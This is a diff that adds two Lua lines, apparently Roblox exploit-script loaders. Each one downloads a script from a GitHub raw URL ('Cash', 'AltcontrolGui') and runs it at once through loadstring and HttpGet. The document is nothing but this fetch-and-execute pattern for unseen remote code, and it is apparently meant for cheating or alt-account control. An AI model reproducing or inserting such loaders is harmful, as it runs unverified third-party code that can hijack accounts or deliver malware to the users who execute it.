@@ -1,1 +1,6 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Joshh-z/Counter/main/Cash'))()
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Joshh-z/RetainXFree/main/AltcontrolGui',))()
+
 
